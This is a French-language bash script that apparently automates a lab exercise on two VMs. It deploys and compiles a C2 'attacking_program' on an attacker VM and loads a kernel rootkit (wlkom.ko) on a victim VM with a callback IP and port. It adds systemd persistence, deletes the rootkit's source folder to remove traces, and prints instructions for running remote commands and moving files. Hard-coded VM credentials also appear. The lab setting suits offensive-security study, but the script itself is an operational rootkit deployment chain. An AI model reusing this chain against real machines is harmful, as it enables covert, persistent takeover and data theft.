#!/bin/bash

# =============================================================================
# WLKOM — Script de déploiement auto
# =============================================================================

set -e

# =============================================================================
# COLORS
# =============================================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# =============================================================================
# CONFIG
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
VM_DIR="$PROJECT_DIR/vms"

VM_USER="wlkom"
VM_PASS="wlkom1234"

ATTACKER_SSH_PORT=2222
VICTIM_SSH_PORT=2223

ATTACKER_IP="192.168.100.10"
VICTIM_IP="192.168.100.20"
C2_PORT=4444

# =============================================================================
# FUNCTIONS
# =============================================================================

log_info()    { echo -e "${CYAN}[INFO]${NC}  $1"; }
log_ok()      { echo -e "${GREEN}[✓]${NC}    $1"; }
log_warn()    { echo -e "${YELLOW}[!]${NC}    $1"; }
log_error()   { echo -e "${RED}[✗]${NC}    $1"; exit 1; }
log_step()    { echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n${BLUE}$1${NC}\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; }

# Test SSH
test_ssh() {
    local port=$1
    local label=$2
    
    log_info "Vérification SSH sur port $port ($label)..."
    
    for i in {1..30}; do
        if ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            -p $port $VM_USER@localhost "exit" 2>/dev/null; then
            log_ok "$label accessible via SSH"
            return 0
        fi
        echo -n "."
        sleep 1
    done
    
    log_error "$label non accessible après 30s (port $port)"
}

# Vérifier les chemins
check_paths() {
    log_step "Vérification des chemins"
    
    [ ! -d "$PROJECT_DIR/attacking_program" ] && log_error "Dossier attacking_program introuvable"
    log_ok "attacking_program trouvé"
    
    [ ! -d "$PROJECT_DIR/rootkit" ] && log_error "Dossier rootkit introuvable"
    log_ok "rootkit trouvé"
}

# Copier attacking_program
deploy_attacking_program() {
    log_step "Déploiement attacking_program vers attacker"
    
    log_info "Suppression ancien dossier (si existe)..."
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $ATTACKER_SSH_PORT $VM_USER@localhost \
        "rm -rf ~/attacking_program" 2>/dev/null || true
    
    log_info "Copie attacking_program..."
    scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -r -P $ATTACKER_SSH_PORT \
        "$PROJECT_DIR/attacking_program" \
        $VM_USER@localhost:~/ \
        | grep -v "^Warning" || true
    
    log_ok "attacking_program copié"
    
    log_info "Compilation..."
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $ATTACKER_SSH_PORT $VM_USER@localhost \
        "cd ~/attacking_program && make clean && make 2>&1 | tail -3"
    
    log_ok "attacking_program compilé"
}

# Copier rootkit
deploy_rootkit() {
    log_step "Déploiement rootkit vers victim"
    
    log_info "Suppression ancien dossier (si existe)..."
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $VICTIM_SSH_PORT $VM_USER@localhost \
        "rm -rf ~/rootkit" 2>/dev/null || true
    
    log_info "Copie rootkit..."
    scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -r -P $VICTIM_SSH_PORT \
        "$PROJECT_DIR/rootkit" \
        $VM_USER@localhost:~/ \
        | grep -v "^Warning" || true
    
    log_ok "rootkit copié"
}

# Compiler et installer rootkit
install_rootkit() {
    log_step "Installation du rootkit"
    
    log_info "Installation linux-headers..."
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $VICTIM_SSH_PORT $VM_USER@localhost \
        "sudo apt update -q && sudo apt install -y linux-headers-\$(uname -r) 2>&1 | grep -i -E '(done|unpacking)' | tail -3" || true
    log_ok "linux-headers installés"
    
    log_info "Compilation du rootkit..."
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $VICTIM_SSH_PORT $VM_USER@localhost \
        "cd ~/rootkit && make clean && make 2>&1 | tail -3"
    log_ok "rootkit compilé"
    
    log_info "Chargement du rootkit..."
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $VICTIM_SSH_PORT $VM_USER@localhost \
        "cd ~/rootkit && sudo insmod wlkom.ko c2_ip=$ATTACKER_IP c2_port=$C2_PORT"
    log_ok "rootkit chargé en mémoire"
}

# Persistence
setup_persistence() {
    log_step "Configuration de la persistance"
    
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $VICTIM_SSH_PORT $VM_USER@localhost "bash -s" << 'PERSIST_SCRIPT'
set -e

echo "[*] Copie du module kernel..."
sudo mkdir -p /lib/modules/$(uname -r)/kernel/wlkom
sudo cp ~/rootkit/wlkom.ko /lib/modules/$(uname -r)/kernel/wlkom/
sudo depmod -a

echo "[*] Création du service systemd..."
sudo tee /etc/systemd/system/wlkom.service > /dev/null << 'SERVICE'
[Unit]
Description=WLKOM Kernel Module
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/insmod /lib/modules/$(uname -r)/kernel/wlkom/wlkom.ko c2_ip=192.168.100.10 c2_port=4444
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
SERVICE

echo "[*] Activation du service..."
sudo systemctl daemon-reload
sudo systemctl enable wlkom.service

echo "[✓] Persistance OK"
PERSIST_SCRIPT

    log_ok "Persistance configurée"
}

# Cleanup
cleanup() {
    log_step "Nettoyage des traces"
    
    log_info "Suppression du dossier ~/rootkit..."
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $VICTIM_SSH_PORT $VM_USER@localhost \
        "rm -rf ~/rootkit"
    log_ok "Traces supprimées"
}

# Verification
verify_rootkit() {
    log_step "Vérification"
    
    log_info "Vérification du chargement du rootkit..."
    RESULT=$(ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $VICTIM_SSH_PORT $VM_USER@localhost \
        "lsmod | grep wlkom" || true)
    
    if [ -n "$RESULT" ]; then
        log_ok "Rootkit actif :"
        echo -e "    ${GREEN}$RESULT${NC}"
    else
        log_warn "wlkom non trouvé dans lsmod (vérifier les logs du rootkit)"
    fi
}

# =============================================================================
# MAIN
# =============================================================================

main() {
    echo -e "${RED}"
    echo "██╗    ██╗██╗     ██╗  ██╗ ██████╗ ███╗   ███╗"
    echo "██║    ██║██║     ██║ ██╔╝██╔═══██╗████╗ ████║"
    echo "██║ █╗ ██║██║     █████╔╝ ██║   ██║██╔████╔██║"
    echo "██║███╗██║██║     ██╔═██╗ ██║   ██║██║╚██╔╝██║"
    echo "╚███╔███╔╝███████╗██║  ██╗╚██████╔╝██║ ╚═╝ ██║"
    echo " ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
    echo -e "${NC}"
    echo "  Deployment Script"
    echo ""
    
    check_paths
    test_ssh $ATTACKER_SSH_PORT "Attacker"
    test_ssh $VICTIM_SSH_PORT "Victim"
    deploy_attacking_program
    deploy_rootkit
    install_rootkit
    setup_persistence
    cleanup
    verify_rootkit
    
    print_next_steps
}

# Prochaines étapes
print_next_steps() {
    log_step "DÉPLOIEMENT TERMINÉ ✓"
    
    echo ""
    echo -e "  ${GREEN}Tout est en place !${NC}"
    echo ""
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo -e "  ${YELLOW}PROCHAINES ÉTAPES${NC}"
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo ""
    echo -e "  ${CYAN}1️⃣  Sur la VM Attacker${NC}"
    echo -e "      Lance le serveur C2 :"
    echo ""
    echo -e "      ${GREEN}ssh wlkom@localhost -p 2222${NC}"
    echo -e "      ${GREEN}cd ~/attacking_program${NC}"
    echo -e "      ${GREEN}./wlkom_c2 4444${NC}"
    echo ""
    echo -e "  ${CYAN}ℹ️  Note :${NC} Le serveur écoute sur le port 4444"
    echo -e "      Le rootkit tentera de se connecter automatiquement"
    echo ""
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo -e "  ${YELLOW}CONTRÔLE DU ROOTKIT${NC}"
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo ""
    echo -e "  Une fois connecté au serveur C2, tu peux :"
    echo ""
    echo -e "    • Envoyer des commandes à exécuter sur la victime"
    echo -e "    • Télécharger des fichiers depuis la victime"
    echo -e "    • Uploader des fichiers vers la victime"
    echo -e "    • etc..."
    echo ""
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo -e "  ${YELLOW}INFOS VMS${NC}"
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo ""
    echo -e "  ${CYAN}Attacker${NC}"
    echo -e "    IP SSH (depuis l'hôte) : localhost:2222"
    echo -e "    Utilisateur : ${VM_USER}"
    echo -e "    Mot de passe : ${VM_PASS}"
    echo ""
    echo -e "  ${CYAN}Victim${NC}"
    echo -e "    IP SSH (depuis l'hôte) : localhost:2223"
    echo -e "    Utilisateur : ${VM_USER}"
    echo -e "    Mot de passe : ${VM_PASS}"
    echo -e "    Rootkit C2 port : ${C2_PORT}"
    echo -e "    Rootkit C2 IP : ${ATTACKER_IP}"
    echo ""
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo ""
}

main
